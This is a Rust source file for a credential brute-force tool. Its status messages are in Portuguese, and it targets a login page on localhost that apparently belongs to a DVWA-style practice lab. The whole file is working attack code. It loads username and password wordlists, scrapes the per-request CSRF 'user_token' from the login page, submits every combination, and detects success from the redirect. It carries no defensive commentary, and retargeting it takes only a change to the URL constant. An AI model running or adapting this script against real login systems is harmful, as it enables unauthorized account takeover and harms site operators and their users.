use reqwest::{Error, blocking::Client};
use std::{
    fs::File,
    io::{BufRead, BufReader},
    process::ExitCode,
};

const TARGET_URL: &str = "http://localhost/login.php";
const USERS_FILE: &str = "../../wordlists/users.txt";
const PASS_FILE: &str = "../../wordlists/pass.txt";

fn main() -> ExitCode {
    let client = Client::builder()
        .cookie_store(true)
        .build()
        .expect("\n[ERROR]: falha ao construir client\n");

    let users = read_wordlist(USERS_FILE);
    let passwords = read_wordlist(PASS_FILE);

    match run_brute_force(&client, &users, &passwords) {
        Some((user, pass)) => {
            println!("\n[SUCCESS]: credencial encontrada: {user}:{pass}\n");
            ExitCode::SUCCESS
        }
        None => {
            println!("\n[ERROR]: nenhuma credencial encontrada.\n");
            ExitCode::FAILURE
        }
    }
}

fn run_brute_force(
    client: &Client,
    users: &[String],
    passwords: &[String],
) -> Option<(String, String)> {
    for username in users {
        for password in passwords {
            let body = match get_login_page(client) {
                Ok(body) => body,
                Err(err) => {
                    eprintln!("\n[ERROR]: {err}\n");
                    continue;
                }
            };

            let token = match extract_user_token(&body) {
                Some(token) => token,
                None => {
                    println!("[-] token nao encontrado, pulando tentativa.");
                    continue;
                }
            };

            println!("[-] testando: {username}:{password}");

            match try_login(client, &token, username, password) {
                Ok(true) => return Some((username.to_owned(), password.to_owned())),
                Ok(false) => continue,
                Err(err) => eprintln!("\n[ERROR]: {err}\n"),
            }
        }
    }
    None
}

fn read_wordlist(path: &str) -> Vec<String> {
    let file = match File::open(path) {
        Ok(file) => file,
        Err(_) => {
            eprintln!(
                "\n[ERROR]: O arquivo '{}' nao foi encontrado ou nao pode ser aberto.\n",
                path
            );
            std::process::exit(1);
        }
    };

    let reader = BufReader::new(file);
    reader
        .lines()
        .filter_map(Result::ok)
        .filter(|line| !line.is_empty())
        .collect()
}

fn get_login_page(client: &Client) -> Result<String, Error> {
    let body = client.get(TARGET_URL).send()?;
    body.text()
}

fn extract_user_token(body: &str) -> Option<String> {
    let marker = "name='user_token' value='";
    let start = body.find(marker)? + marker.len();
    let end = body[start..].find('\'')? + start;
    Some(body[start..end].to_string())
}

fn try_login(client: &Client, token: &str, username: &str, password: &str) -> Result<bool, Error> {
    let params = [
        ("username", username),
        ("password", password),
        ("Login", "Login"),
        ("user_token", token),
    ];

    let resp = client.post(TARGET_URL).form(&params).send()?;

    Ok(resp.url().path() != "/login.php")
}
